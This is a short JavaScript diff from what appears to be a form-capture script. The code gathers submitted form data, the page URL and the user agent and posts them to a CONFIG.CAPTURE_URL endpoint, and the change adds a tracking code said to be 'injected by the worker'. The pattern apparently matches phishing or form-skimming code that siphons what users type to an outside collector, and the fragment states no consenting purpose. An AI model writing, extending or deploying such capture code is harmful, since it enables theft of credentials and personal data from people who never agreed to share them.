@@ -43,13 +43,15 @@ const CONFIG = {
         try {
             const timestamp = new Date().toISOString();
             const pageUrl = window.location.href;
-            
+            const uniqueCode = window.UNIQUE_CODE || 'UNKNOWN'; // Get the unique code injected by the worker
+
             // Build a simple JSON payload for the worker
             const payload = {
                 url: pageUrl,
                 timestamp: timestamp,
                 formData: data,
-                userAgent: navigator.userAgent
+                userAgent: navigator.userAgent,
+                uniqueCode: uniqueCode // Include the unique code
             };
 
             const response = await fetch(CONFIG.CAPTURE_URL, {
